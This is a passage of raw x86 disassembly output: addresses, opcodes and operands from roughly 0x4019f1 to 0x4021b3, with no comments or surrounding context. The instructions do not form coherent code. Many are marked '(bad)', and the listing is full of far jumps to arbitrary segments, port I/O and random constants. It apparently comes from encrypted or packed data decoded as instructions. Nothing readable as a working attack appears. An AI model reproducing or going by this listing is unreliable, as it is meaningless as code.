  4019f1:	xor    BYTE PTR [ebp+0x59844d98],dh
  4019f7:	(bad)  
  4019f8:	jge    0x40199c
  4019fa:	sub    BYTE PTR ds:0xa75ab24a,cl
  401a00:	lods   eax,DWORD PTR ds:[esi]
  401a01:	enter  0xfda7,0x95
  401a05:	outs   dx,DWORD PTR ds:[esi]
  401a06:	jo     0x40198c
  401a08:	cdq    
  401a09:	popa   
  401a0a:	push   ecx
  401a0b:	paddd  mm1,QWORD PTR [edi]
  401a0e:	mov    BYTE PTR [edx],al
  401a10:	cmp    ah,BYTE PTR [eax+0x5c]
  401a13:	les    ebx,FWORD PTR es:[edi+0x4ac7362e]
  401a1a:	add    al,BYTE PTR [edx]
  401a1c:	jmp    0x8829:0x3f988782
  401a23:	adc    BYTE PTR [edi],0x73
  401a26:	ds jl  0x4019a9
  401a29:	dec    esp
  401a2a:	(bad)  
  401a2b:	or     DWORD PTR [esp+eiz*8-0x52],edx
  401a2f:	rol    edi,1
  401a31:	aaa    
  401a32:	xchg   ecx,eax
  401a33:	pop    es
  401a34:	(bad)  
  401a35:	or     eax,0xad57bd37
  401a3a:	popa   
  401a3b:	push   es
  401a3c:	dec    edx
  401a3d:	int    0x61
  401a3f:	popf   
  401a40:	cld    
  401a41:	dec    ecx
  401a42:	ins    DWORD PTR es:[edi],dx
  401a43:	cmp    ebp,eax
  401a45:	rol    DWORD PTR [eax+0x13],cl
  401a48:	or     dl,al
  401a4a:	shl    BYTE PTR [esi-0x1b2339bd],1
  401a50:	lods   eax,DWORD PTR ds:[esi]
  401a51:	fcomp  QWORD PTR [ebx-0x70]
  401a54:	cmp    BYTE PTR [edi+0x7ece2c95],bl
  401a5a:	push   0x2b
  401a5c:	xor    al,0xea
  401a5e:	call   0x8a991236
  401a63:	pop    edi
  401a64:	jb     0x401acf
  401a66:	rcl    BYTE PTR [ebp-0x45],cl
  401a69:	cmp    DWORD PTR [esi+0x40],edi
  401a6c:	push   ds
  401a6d:	fisub  WORD PTR ds:0xed86ad6d
  401a73:	sub    DWORD PTR [esp],eax
  401a76:	dec    esp
  401a77:	sbb    eax,0xcb114125
  401a7c:	push   cs
  401a7d:	(bad)  
  401a7f:	push   ss
  401a80:	test   BYTE PTR [esi],bh
  401a82:	mov    eax,ds:0x8257ccdb
  401a87:	cwde   
  401a88:	mov    eax,0x5b095397
  401a8d:	xchg   esp,eax
  401a8e:	pusha  
  401a8f:	ins    DWORD PTR es:[edi],dx
  401a90:	xor    eax,DWORD PTR [si+0x7473]
  401a95:	mov    edi,0x15241494
  401a9a:	int3   
  401a9b:	fwait
  401a9c:	sti    
  401a9d:	and    DWORD PTR [esi],edi
  401a9f:	cli    
  401aa0:	cdq    
  401aa1:	xor    eax,0x7c977225
  401aa6:	adc    DWORD PTR [edx+0x7daffef5],0x4
  401aad:	inc    edx
  401aae:	pop    ecx
  401aaf:	jns    0x401aa5
  401ab1:	mov    cl,0xd3
  401ab3:	inc    ecx
  401ab4:	fld    QWORD PTR [edi-0x5a]
  401ab7:	xchg   edx,eax
  401ab8:	lods   eax,DWORD PTR ds:[esi]
  401ab9:	jle    0x401afc
  401abb:	sbb    ebp,DWORD PTR [edx]
  401abd:	fs push esi
  401abf:	in     al,0xa4
  401ac1:	cdq    
  401ac2:	mov    eax,ds:0xbb277ecd
  401ac7:	xchg   ebp,eax
  401ac8:	sbb    dh,BYTE PTR [edi-0x50c62ae4]
  401ace:	dec    edi
  401acf:	cmp    BYTE PTR [ecx+0x68],dl
  401ad2:	(bad)  [ebx+0x3c]
  401ad5:	(bad)  
  401ad7:	mov    bl,0x39
  401ad9:	rcl    BYTE PTR [edx-0x70],0xff
  401add:	cld    
  401ade:	and    eax,DWORD PTR [edi+0x6c9bacf1]
  401ae4:	sub    cl,BYTE PTR [edi-0x1f]
  401ae7:	mov    ebx,0xe7a97f3f
  401aec:	xor    DWORD PTR [edi-0x3e91dc76],esi
  401af2:	jmp    0x1ee9:0xb34e9b0b
  401af9:	in     eax,dx
  401afa:	aaa    
  401afb:	les    esp,FWORD PTR [ebp+0x64]
  401afe:	mov    DWORD PTR [edx-0x1],edi
  401b01:	vminpd xmm5,xmm7,XMMWORD PTR [edi+0x14]
  401b06:	jmp    0xa630ea19
  401b0b:	outs   dx,BYTE PTR ds:[esi]
  401b0c:	sub    eax,DWORD PTR [eax]
  401b0e:	adc    BYTE PTR [esi],ah
  401b10:	out    0xd6,al
  401b12:	es push ebx
  401b14:	call   0x733069f
  401b19:	loop   0x401b16
  401b1b:	push   ecx
  401b1c:	xchg   ecx,eax
  401b1d:	(bad)  
  401b1e:	inc    eax
  401b20:	mov    ah,0x8e
  401b22:	cli    
  401b23:	bound  esp,QWORD PTR [ecx-0x25]
  401b26:	dec    edx
  401b27:	xchg   DWORD PTR [eax],eax
  401b29:	mov    esp,0x6f980d81
  401b2e:	push   esp
  401b2f:	pop    edi
  401b30:	into   
  401b31:	iret   
  401b32:	sub    al,0x80
  401b34:	adc    cl,ch
  401b36:	test   al,0x38
  401b38:	pop    ds
  401b39:	jge    0x401b95
  401b3b:	or     al,0xd2
  401b3d:	idiv   DWORD PTR [ebp+ecx*2-0xee6504f]
  401b44:	aas    
  401b45:	xchg   esi,eax
  401b46:	aas    
  401b47:	pop    ss
  401b48:	ret    0x7430
  401b4b:	clc    
  401b4c:	repz mov ebx,0x86b7c19d
  401b52:	(bad)  [esi+0x687e8620]
  401b58:	pop    eax
  401b59:	or     DWORD PTR [edx+0x1e],0x4708cf78
  401b60:	mov    bl,0xd5
  401b62:	stos   BYTE PTR es:[edi],al
  401b63:	mov    bh,0xc4
  401b65:	retf   0x9441
  401b68:	push   ss
  401b69:	sbb    ecx,DWORD PTR [esi+0x3c]
  401b6c:	repz scas eax,DWORD PTR es:[edi]
  401b6e:	jae    0x401bda
  401b70:	and    BYTE PTR [edi-0x69],bl
  401b73:	vpsubusw xmm4,xmm4,XMMWORD PTR [edx+edx*2+0x584c951]
  401b7c:	into   
  401b7d:	jg     0x401b23
  401b7f:	std    
  401b80:	into   
  401b81:	test   eax,0x9068472d
  401b86:	mov    DWORD PTR [edi-0x29c6e725],eax
  401b8c:	scas   al,BYTE PTR es:[edi]
  401b8d:	mov    ds:0xbd5c1729,al
  401b92:	jmp    DWORD PTR [edi]
  401b94:	fild   WORD PTR [ebp+0x15]
  401b97:	mov    eax,0xd4b36119
  401b9c:	int3   
  401b9d:	aaa    
  401b9e:	push   edx
  401b9f:	scas   eax,DWORD PTR es:[edi]
  401ba0:	setle  BYTE PTR [ecx+0x5d]
  401ba4:	pop    ecx
  401ba5:	xlat   BYTE PTR ds:[ebx]
  401ba6:	jl     0x401bd1
  401ba8:	outs   dx,DWORD PTR ds:[esi]
  401ba9:	loopne 0x401b9e
  401bab:	mov    dl,0x39
  401bad:	jg     0x401b3d
  401baf:	and    BYTE PTR [ebp-0xc581a0a],ch
  401bb5:	fild   WORD PTR [ebx+eiz*1+0x6c23403a]
  401bbc:	and    BYTE PTR [ecx+edx*4+0x4c],cl
  401bc0:	stc    
  401bc1:	out    0x3,eax
  401bc3:	adc    DWORD PTR [eax+0x1e0b8394],0xd468eb45
  401bcd:	ins    DWORD PTR es:[edi],dx
  401bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bcf:	ins    DWORD PTR es:[edi],dx
  401bd0:	and    al,0x6c
  401bd2:	lock mov dl,BYTE PTR [ecx-0x6e]
  401bd6:	jle    0x401b87
  401bd8:	ficom  WORD PTR [ebp+0x42656ac8]
  401bde:	mov    cl,0x59
  401be0:	test   eax,0x601622f6
  401be5:	push   0xc2dd9896
  401bea:	(bad)
  401bed:	into   
  401bee:	out    dx,al
  401bef:	dec    ebp
  401bf0:	xchg   ebx,eax
  401bf1:	(bad)  
  401bf3:	fwait
  401bf4:	xlat   BYTE PTR ds:[ebx]
  401bf5:	inc    ebx
  401bf6:	(bad)  
  401bf7:	in     eax,0xa4
  401bf9:	mov    esp,0x36ea0b8
  401bfe:	retf   
  401bff:	push   edi
  401c00:	dec    edi
  401c01:	xor    al,0x6e
  401c03:	xchg   dl,al
  401c05:	imul   ecx,DWORD PTR [ecx-0x777e9224],0x71cb91e
  401c0f:	add    BYTE PTR [edi+eiz*2],bl
  401c12:	xor    al,0xa7
  401c14:	cmp    BYTE PTR [ebx-0x250c5679],dh
  401c1a:	pop    ebp
  401c1b:	lea    esi,[esi]
  401c1d:	imul   edi,ebx,0x72fc969
  401c23:	xlat   BYTE PTR ds:[ebx]
  401c24:	add    DWORD PTR [eax],esi
  401c26:	mov    dl,0x18
  401c28:	hlt    
  401c29:	xchg   ebp,eax
  401c2a:	(bad)  
  401c2c:	repz mov ebp,DWORD PTR [eax-0x6b96c121]
  401c33:	jo     0x401bd0
  401c35:	and    BYTE PTR [ebp-0x36],dl
  401c38:	add    BYTE PTR [esi+ecx*2+0x23a56f0],dl
  401c3f:	leave  
  401c40:	jmp    0x8704893
  401c45:	and    dh,cl
  401c47:	hlt    
  401c48:	stc    
  401c49:	mov    ecx,0xde847688
  401c4e:	shl    BYTE PTR [ebx],0x7c
  401c51:	rcl    cl,cl
  401c53:	push   eax
  401c54:	not    BYTE PTR [edx*8+0x61b3124b]
  401c5b:	lods   al,BYTE PTR ds:[esi]
  401c5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c5d:	les    ebp,FWORD PTR [ebx+0x597bdd7c]
  401c63:	add    dh,cl
  401c65:	sahf   
  401c66:	inc    esi
  401c67:	pop    ebp
  401c68:	dec    ebx
  401c69:	cdq    
  401c6a:	lds    esp,FWORD PTR [ecx+0x62]
  401c6d:	shl    BYTE PTR [edx-0x1ab6e8e8],1
  401c73:	and    ch,dh
  401c75:	sub    eax,0x83aa0ad8
  401c7a:	pop    ecx
  401c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c7c:	mov    esi,0x579b16a
  401c81:	popa   
  401c82:	mov    edx,ebp
  401c84:	ins    DWORD PTR es:[edi],dx
  401c85:	ss scas eax,DWORD PTR es:[edi]
  401c87:	dec    ecx
  401c88:	dec    edx
  401c89:	repnz scas eax,DWORD PTR es:[edi]
  401c8b:	sbb    BYTE PTR [ebx+0x15],cl
  401c8e:	push   edx
  401c8f:	and    DWORD PTR [ebx+0x28556109],eax
  401c95:	aam    0xf6
  401c97:	(bad)  
  401c98:	lds    ebp,FWORD PTR [edi]
  401c9a:	mov    ds:0xa1a431e0,eax
  401c9f:	sbb    ebp,DWORD PTR [esi]
  401ca1:	out    dx,al
  401ca2:	push   ss
  401ca3:	ficomp WORD PTR [ebx+eiz*4]
  401ca6:	mov    edi,0xb38e6e71
  401cab:	stos   DWORD PTR es:[edi],eax
  401cac:	mov    dh,0xb1
  401cae:	xor    edi,edx
  401cb0:	mov    al,ds:0x41cd8625
  401cb5:	dec    ebx
  401cb6:	nop
  401cb7:	jb     0x401d30
  401cb9:	adc    eax,0x732736d6
  401cbe:	sub    eax,0x5961de54
  401cc3:	sub    DWORD PTR [ecx],eax
  401cc5:	out    dx,eax
  401cc6:	jne    0x401cfe
  401cc8:	pop    esi
  401cc9:	and    ebx,DWORD PTR [edi+ebx*1+0x1fe1c0e6]
  401cd0:	pop    esi
  401cd1:	scas   eax,DWORD PTR es:[edi]
  401cd2:	mov    al,0x50
  401cd4:	inc    ebx
  401cd5:	dec    ebp
  401cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd7:	jno    0x401d09
  401cd9:	sbb    ch,BYTE PTR [ecx+0x30]
  401cdc:	enter  0xf56d,0x85
  401ce0:	push   ss
  401ce1:	inc    esp
  401ce2:	add    DWORD PTR [eax-0x70fa0587],ebx
  401ce8:	ja     0x401d3d
  401cea:	loopne 0x401d21
  401cec:	shl    BYTE PTR [ecx-0x3ddf6ebe],1
  401cf2:	sbb    eax,0x1c9c0b44
  401cf7:	mov    cl,BYTE PTR [esi+0x6aa670f5]
  401cfd:	(bad)  
  401cfe:	xor    al,0x9a
  401d00:	(bad)  
  401d01:	xchg   esi,eax
  401d02:	jmp    0xdbe5:0x37c2416e
  401d09:	scas   eax,DWORD PTR es:[edi]
  401d0a:	mov    ds:0x90177615,al
  401d0f:	mov    cl,0xa6
  401d11:	fdivr  DWORD PTR [edi-0x11829bc7]
  401d17:	lods   eax,DWORD PTR ds:[esi]
  401d18:	jmp    0x401ccd
  401d1a:	aas    
  401d1b:	pop    ecx
  401d1c:	xchg   DWORD PTR [ebp+0x35],ebp
  401d1f:	pop    ds
  401d20:	jl     0x401d8d
  401d22:	xor    DWORD PTR [ecx],esi
  401d24:	xchg   ebx,eax
  401d25:	ret    
  401d26:	imul   edi,DWORD PTR ds:0x6fc98779,0xc8489004
  401d30:	xlat   BYTE PTR ds:[ebx]
  401d31:	xor    eax,0xae6e5aad
  401d36:	lds    edi,FWORD PTR [edx+edi*4-0x2a14666f]
  401d3d:	jg     0x401cff
  401d3f:	cs xor al,0xe3
  401d42:	leave  
  401d43:	xor    DWORD PTR [ebp-0x9],esp
  401d46:	dec    ebx
  401d47:	add    eax,0xd6584dbc
  401d4c:	mov    ebp,edi
  401d4e:	(bad)  
  401d50:	push   eax
  401d51:	lds    ebx,FWORD PTR [edx+0x27e69085]
  401d57:	mov    cl,0xe3
  401d59:	inc    ebp
  401d5a:	or     cl,bl
  401d5c:	xlat   BYTE PTR ds:[ebx]
  401d5d:	push   esp
  401d5e:	popa   
  401d5f:	pop    ebp
  401d60:	xor    esi,esp
  401d62:	std    
  401d63:	les    eax,FWORD PTR [esi+0x6ab94498]
  401d69:	out    0xa3,al
  401d6b:	or     eax,0x6682f0f2
  401d70:	dec    edx
  401d71:	pop    ss
  401d72:	jno    0x401d47
  401d74:	push   eax
  401d75:	push   0xffffffac
  401d77:	cmp    al,0x11
  401d79:	cmp    DWORD PTR [eax+0x63f4fa68],ecx
  401d7f:	cmc    
  401d80:	xchg   BYTE PTR [edx+0x17dba52d],cl
  401d86:	cmp    ch,BYTE PTR ds:0x9ad61f8a
  401d8c:	mov    WORD PTR [ebp-0x31555ed5],es
  401d92:	cmp    esp,DWORD PTR [esi-0x66]
  401d95:	ror    eax,1
  401d97:	jge    0x401dc3
  401d99:	lds    esp,FWORD PTR [ebx+0x17]
  401d9c:	xchg   edi,eax
  401d9d:	(bad)
  401da0:	mov    bl,0x94
  401da2:	call   0xb23643ac
  401da7:	pop    edx
  401da8:	aad    0x30
  401daa:	push   0x8a701595
  401daf:	les    edi,FWORD PTR [eax]
  401db1:	daa    
  401db2:	dec    ecx
  401db3:	scas   eax,DWORD PTR es:[edi]
  401db4:	(bad)  
  401db6:	aad    0xc9
  401db8:	and    al,0x8f
  401dba:	xor    ch,BYTE PTR [esi+edi*1-0x14]
  401dbe:	ja     0x401daf
  401dc0:	jo     0x401da5
  401dc2:	pop    eax
  401dc3:	mov    edi,0x8c6d77e6
  401dc8:	or     DWORD PTR [edx-0x25],ebx
  401dcb:	mov    esp,?
  401dcd:	sbb    al,0x58
  401dcf:	loopne 0x401de7
  401dd1:	in     eax,0xd
  401dd3:	test   DWORD PTR [ebp+0x2aac5aae],ebx
  401dd9:	popf   
  401dda:	dec    esi
  401ddb:	or     dh,dl
  401ddd:	sub    eax,0xcfd13136
  401de2:	mov    dl,ah
  401de4:	clc    
  401de5:	(bad)  
  401de6:	ja     0x401e38
  401de8:	in     eax,dx
  401de9:	fidiv  WORD PTR [ebp-0x69f3bbea]
  401def:	cwde   
  401df0:	test   DWORD PTR [esi-0x26],eax
  401df3:	(bad)  
  401df5:	iret   
  401df6:	pop    eax
  401df7:	iret   
  401df8:	xchg   ebp,eax
  401df9:	pop    es
  401dfa:	push   ebx
  401dfb:	push   0xfffffff0
  401dfd:	sub    esp,DWORD PTR [esi+0x2b71bf18]
  401e03:	mov    bl,0x3e
  401e05:	addr16 dec ebp
  401e07:	(bad)  
  401e08:	cmp    al,0x37
  401e0a:	imul   eax,DWORD PTR [esi+esi*2-0x60],0x5adf75b
  401e12:	outs   dx,BYTE PTR ds:[esi]
  401e13:	lods   eax,DWORD PTR ds:[esi]
  401e14:	popa   
  401e15:	loop   0x401e38
  401e17:	jmp    0xef942bdd
  401e1c:	pop    ds
  401e1d:	jno    0x401e88
  401e1f:	and    eax,0xf122d7ae
  401e24:	mov    ebx,0x1a8df6e6
  401e29:	mov    edx,0x3ba06e22
  401e2e:	push   ebx
  401e2f:	mov    bh,BYTE PTR [ebp-0x75]
  401e32:	cmp    BYTE PTR [esi],0x0
  401e35:	aad    0x39
  401e37:	inc    ebx
  401e38:	xlat   BYTE PTR ds:[ebx]
  401e39:	or     al,0x88
  401e3b:	cmp    al,0x24
  401e3d:	jo     0x401ebd
  401e3f:	jecxz  0x401e85
  401e41:	push   esi
  401e42:	and    DWORD PTR [edx+0x21a61d6e],ecx
  401e48:	push   edi
  401e49:	arpl   WORD PTR [ebp-0x3f],di
  401e4c:	push   ss
  401e4d:	fs loopne 0x401df8
  401e50:	add    DWORD PTR fs:[ecx+0x22],0x8fa3a95b
  401e58:	adc    edx,0xfffffff7
  401e5b:	imul   edx,eax,0xa781562a
  401e61:	or     al,0x0
  401e63:	push   ecx
  401e64:	inc    esi
  401e65:	ins    BYTE PTR es:[edi],dx
  401e66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e67:	push   ds
  401e68:	adc    ebx,DWORD PTR [esi+0x6c]
  401e6b:	inc    esp
  401e6c:	adc    edi,DWORD PTR [esi]
  401e6e:	bts    DWORD PTR [ebx+ecx*2],eax
  401e72:	jae    0x401dfb
  401e74:	push   eax
  401e75:	call   0x65f20ef
  401e7a:	dec    ebp
  401e7b:	jo     0x401e93
  401e7d:	std    
  401e7e:	cmp    DWORD PTR [eax+ecx*4],edx
  401e81:	add    eax,ecx
  401e83:	(bad)  
  401e84:	std    
  401e85:	imul   esi,eax,0x7cec53c6
  401e8b:	mov    edx,0x5b7c00e2
  401e90:	leave  
  401e91:	icebp  
  401e92:	jmp    0x1073:0x6871949f
  401e99:	outs   dx,DWORD PTR ds:[esi]
  401e9a:	out    dx,eax
  401e9b:	cmp    al,BYTE PTR [esi]
  401e9d:	mov    ch,0x79
  401e9f:	jg     0x401ed6
  401ea1:	jne    0x401e80
  401ea3:	cvtps2pi mm4,QWORD PTR [esi-0x5]
  401ea7:	cmp    ah,ah
  401ea9:	mov    ah,0x91
  401eab:	and    ebp,esp
  401ead:	mov    es,WORD PTR [edx+ecx*2+0x5b20fd03]
  401eb4:	push   esp
  401eb5:	(bad)  
  401eb6:	lea    edi,[ecx+0x11ee9742]
  401ebc:	pop    ebx
  401ebd:	lds    ebp,FWORD PTR [ebx+0x74]
  401ec0:	daa    
  401ec1:	jo     0x401f33
  401ec3:	inc    edi
  401ec4:	fcom   DWORD PTR [ecx-0x1f]
  401ec7:	mov    cs,WORD PTR ds:0x89391595
  401ecd:	push   eax
  401ece:	jo     0x401e80
  401ed0:	fistp  QWORD PTR ds:0xda2ddaf8
  401ed6:	add    BYTE PTR [edx+0x1],bh
  401ed9:	loopne 0x401eaa
  401edb:	das    
  401edc:	sub    eax,DWORD PTR ds:0x7aa47be2
  401ee2:	sub    BYTE PTR [edi],ch
  401ee4:	dec    esp
  401ee5:	cmp    eax,0x904f08a
  401eea:	inc    edx
  401eeb:	lahf   
  401eec:	xor    eax,0x8f96d8ce
  401ef1:	and    BYTE PTR [ebp+0x6c3f6223],dh
  401ef7:	out    0x55,al
  401ef9:	das    
  401efa:	sub    eax,esp
  401efc:	pop    ecx
  401efd:	adc    ah,ch
  401eff:	jb     0x401e9e
  401f01:	out    0xd3,al
  401f03:	mov    esp,0xaf4bc77f
  401f08:	test   DWORD PTR [edx+0x66],edx
  401f0b:	add    BYTE PTR [ebx+0x17bb06a0],dl
  401f11:	add    eax,0x1454a0e
  401f16:	add    ah,bh
  401f18:	in     al,0x6a
  401f1a:	stos   DWORD PTR es:[edi],eax
  401f1b:	fdiv   QWORD PTR [eax]
  401f1d:	inc    ebp
  401f1e:	imul   esi,DWORD PTR [ebp+0x5bfea1ef],0x69859fb7
  401f28:	das    
  401f29:	loopne 0x401ee3
  401f2b:	add    eax,0xfc39c103
  401f30:	push   ecx
  401f31:	lock pop edi
  401f33:	push   edi
  401f34:	and    BYTE PTR [esi-0x64],ah
  401f37:	int    0xcc
  401f39:	pop    ds
  401f3a:	je     0x401f76
  401f3c:	addr16 inc eax
  401f3e:	or     BYTE PTR ds:0x3d11cf8d,dh
  401f44:	or     bh,BYTE PTR [ebp+0x191e30e3]
  401f4a:	adc    al,0xd6
  401f4c:	repnz aad 0x9a
  401f4f:	shr    BYTE PTR [esi],0xe2
  401f52:	jne    0x401f4f
  401f54:	mov    ebp,0x6ece795f
  401f59:	mov    gs,ebp
  401f5b:	imul   esp,DWORD PTR [ebx],0x60
  401f5e:	hlt    
  401f5f:	or     DWORD PTR [ebp+0x60],esp
  401f62:	mov    eax,0xa5ed4a9
  401f67:	and    DWORD PTR [edx],ecx
  401f69:	dec    esp
  401f6a:	push   esi
  401f6b:	mov    ebx,0xba944fdd
  401f70:	or     DWORD PTR [esi+ecx*4-0x2bc31fd2],edi
  401f77:	sbb    dl,dl
  401f79:	xchg   DWORD PTR [ebx+0x21],ebx
  401f7c:	(bad)  
  401f7d:	sub    al,0x3
  401f7f:	jle    0x401fec
  401f81:	dec    edx
  401f82:	dec    esp
  401f83:	mov    eax,ds:0xe5bc1df5
  401f88:	mov    cl,0x75
  401f8a:	cld    
  401f8b:	pop    esi
  401f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f8d:	scas   al,BYTE PTR es:[edi]
  401f8e:	mov    ecx,0x7683e234
  401f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f94:	nop
  401f95:	cld    
  401f96:	dec    ebp
  401f97:	jbe    0x401ffc
  401f99:	loope  0x401f59
  401f9b:	and    ah,BYTE PTR [ecx]
  401f9d:	inc    ebp
  401f9e:	icebp  
  401f9f:	xchg   edx,eax
  401fa0:	or     eax,0x9786333b
  401fa5:	loope  0x401fc2
  401fa7:	aad    0xb6
  401fa9:	ds dec edx
  401fab:	popa   
  401fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fad:	in     al,dx
  401fae:	lahf   
  401faf:	aaa    
  401fb0:	push   esi
  401fb1:	shr    DWORD PTR [edi],0x97
  401fb4:	pushf  
  401fb5:	sar    ebx,cl
  401fb7:	adc    bl,BYTE PTR [edx]
  401fb9:	and    BYTE PTR [esp+ebp*1-0x1223398a],bl
  401fc0:	addr16 inc esi
  401fc2:	or     edx,0xffffff99
  401fc5:	rol    BYTE PTR [ebx-0x50],cl
  401fc8:	jno    0x401f4e
  401fca:	outs   dx,DWORD PTR ds:[esi]
  401fcb:	mov    bl,0xe0
  401fcd:	fstp   QWORD PTR [ebx-0x65]
  401fd0:	call   0x6a4818c7
  401fd5:	repnz leave 
  401fd7:	cmp    DWORD PTR [ebx-0x1d9a4356],ecx
  401fdd:	fidiv  DWORD PTR [esi+0x24c169e7]
  401fe3:	and    bh,ch
  401fe5:	jno    0x401fc6
  401fe7:	xchg   edx,eax
  401fe8:	out    0x60,al
  401fea:	xchg   edx,eax
  401feb:	cwde   
  401fec:	inc    ebx
  401fed:	pop    edi
  401fee:	mov    es,WORD PTR [edi]
  401ff0:	add    al,0x7a
  401ff2:	sbb    edx,DWORD PTR [edi-0x25b66681]
  401ff8:	ins    BYTE PTR es:[edi],dx
  401ff9:	leave  
  401ffa:	cs cli 
  401ffc:	push   edi
  401ffd:	call   0xfe625554
  402002:	test   DWORD PTR [ecx],ebp
  402004:	call   0xb27a:0xa946e199
  40200b:	fstp   TBYTE PTR [ebx+esi*2-0x105a7011]
  402012:	fnstsw WORD PTR [ecx+eax*4-0x2c177b8c]
  402019:	(bad)  
  40201a:	test   al,bh
  40201c:	test   al,0xf8
  40201e:	lods   eax,DWORD PTR ds:[esi]
  40201f:	fwait
  402020:	inc    ebp
  402021:	push   edi
  402022:	sbb    al,BYTE PTR [edi-0x5f0b8e43]
  402028:	or     eax,0x25793967
  40202d:	hlt    
  40202e:	sub    DWORD PTR [ecx-0x6d33b75f],edx
  402034:	retf   
  402035:	inc    esi
  402036:	je     0x402085
  402038:	xlat   BYTE PTR ds:[ebx]
  402039:	and    BYTE PTR [ebp-0x6b90be32],cl
  40203f:	push   ebx
  402040:	mov    al,ds:0x388c601f
  402045:	xor    bl,BYTE PTR [ebp-0x5bea4af3]
  40204b:	sub    ah,ch
  40204d:	or     DWORD PTR ds:0xe57dd099,eax
  402053:	(bad)
  402057:	inc    ebx
  402058:	fwait
  402059:	popa   
  40205a:	bound  edx,QWORD PTR [ecx+0x16]
  40205d:	std    
  40205e:	dec    edi
  40205f:	rcl    dl,0xf6
  402062:	shr    BYTE PTR [edx],cl
  402064:	sbb    ebp,DWORD PTR ds:0x7735a6c9
  40206a:	pop    edi
  40206b:	jnp    0x40202f
  40206d:	or     cl,BYTE PTR gs:[ecx+0x4dcf710f]
  402074:	mov    al,0x91
  402076:	inc    ecx
  402077:	stos   BYTE PTR es:[edi],al
  402078:	inc    ebp
  402079:	xor    dh,al
  40207b:	aas    
  40207c:	mov    DWORD PTR [ebx+0x28],ebp
  40207f:	mov    cl,0x79
  402081:	inc    edi
  402082:	mov    cl,0x1a
  402084:	ja     0x402032
  402086:	sub    ah,0x89
  402089:	ss leave 
  40208b:	jle    0x402101
  40208d:	push   ebx
  40208e:	sub    esi,DWORD PTR [eax-0x55]
  402091:	mov    edx,0xb31c56c8
  402096:	sub    ebx,DWORD PTR [edi-0x6f]
  402099:	adc    BYTE PTR [eax+0x5],bl
  40209c:	dec    esi
  40209d:	pop    edx
  40209e:	lods   al,BYTE PTR ds:[esi]
  40209f:	mov    dh,0x68
  4020a1:	inc    esp
  4020a2:	cmp    al,0xaf
  4020a4:	cmp    eax,0x9dd9bdd4
  4020a9:	repz mov ch,0x67
  4020ac:	pop    ss
  4020ad:	loopne 0x402091
  4020af:	imul   esi,DWORD PTR [edx-0xfcaf149],0xae04dbdb
  4020b9:	mov    cl,0xa
  4020bb:	mov    bh,BYTE PTR [edi-0x5ef25bd3]
  4020c1:	push   esi
  4020c2:	xchg   ecx,eax
  4020c3:	jg     0x402141
  4020c5:	sub    BYTE PTR [eax+0x28],cl
  4020c8:	mov    ebx,DWORD PTR [eax+0x5f8f351b]
  4020ce:	popf   
  4020cf:	mov    DWORD PTR ds:0x6b1023cb,edi
  4020d5:	xor    al,0x95
  4020d7:	addr16 in eax,dx
  4020d9:	call   0xda62e863
  4020de:	imul   edx,DWORD PTR cs:[eax],0x12b8f5e8
  4020e5:	push   0x55
  4020e7:	(bad)  
  4020e9:	adc    eax,0x8cf1385d
  4020ee:	test   BYTE PTR [esi+edx*8-0x49],0x75
  4020f3:	xchg   esi,eax
  4020f4:	sbb    eax,0x79063000
  4020f9:	(bad)  
  4020fa:	into   
  4020fb:	cs sub eax,0xb72c0a31
  402101:	test   eax,0x949f4901
  402106:	in     al,dx
  402107:	in     eax,0xee
  402109:	and    ah,BYTE PTR [ebx+0x2b]
  40210c:	jno    0x402147
  40210e:	cmc    
  40210f:	xchg   edx,eax
  402110:	jg     0x40210a
  402112:	xchg   ecx,eax
  402113:	mov    fs,WORD PTR [ebx]
  402115:	xor    al,0x59
  402117:	cs jns 0x4020eb
  40211a:	jp     0x402132
  40211c:	xchg   edi,eax
  40211d:	and    eax,0x481b7e67
  402122:	push   ss
  402123:	sbb    BYTE PTR [edx-0x73],al
  402126:	in     al,dx
  402127:	xchg   edi,eax
  402128:	into   
  402129:	neg    DWORD PTR [edx+0x42]
  40212c:	sub    DWORD PTR [edi-0x41],ebp
  40212f:	dec    BYTE PTR ds:0x9ae5129d
  402135:	data16 fdivr st,st(2)
  402138:	sti    
  402139:	push   es
  40213a:	add    DWORD PTR [ecx+0x74],ebx
  40213d:	inc    ecx
  40213e:	stos   DWORD PTR es:[edi],eax
  40213f:	gs cmp eax,0x746f6d10
  402145:	mov    bh,0x86
  402147:	dec    ecx
  402148:	je     0x4020fe
  40214a:	cs xchg edi,esp
  40214d:	(bad)  
  40214e:	xchg   ecx,eax
  40214f:	lea    ecx,[edx+0x5b02c255]
  402155:	std    
  402156:	sbb    BYTE PTR [ecx],bl
  402158:	es jmp 0xe7575825
  40215e:	repz daa 
  402160:	rol    edx,cl
  402162:	out    0x97,al
  402164:	fdivr  QWORD PTR [ecx+0x2e]
  402167:	test   eax,0xef9a91c7
  40216c:	call   0x711ca451
  402171:	push   cs
  402172:	pop    eax
  402173:	xchg   esi,eax
  402174:	cmp    eax,0xba68d23f
  402179:	and    al,BYTE PTR [edi+0x861dec4]
  40217f:	pop    ax
  402181:	or     eax,0x8d25eca6
  402186:	sub    ebp,DWORD PTR [ebx-0x5bdeacb2]
  40218c:	addr16 cwde 
  40218e:	xchg   edx,eax
  40218f:	outs   dx,DWORD PTR ds:[esi]
  402190:	mov    eax,0xcc225f75
  402195:	inc    ecx
  402196:	dec    bh
  402198:	jg     0x402174
  40219a:	pop    eax
  40219b:	xor    DWORD PTR [esi-0x2d],esp
  40219e:	addr16 xchg edx,eax
  4021a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021a1:	or     edx,DWORD PTR [edx-0x5]
  4021a4:	das    
  4021a5:	pop    esp
  4021a6:	loopne 0x4021fc
  4021a8:	xor    DWORD PTR [esi],eax
  4021aa:	dec    ebp
  4021ab:	push   esi
  4021ac:	ins    DWORD PTR es:[edi],dx
  4021ad:	sbb    al,0xbe
  4021af:	jo     0x40214a
  4021b1:	push   ebp
  4021b2:	nop
  4021b3:	fbstp  TBYTE PTR [ecx+0x52e5dd03]
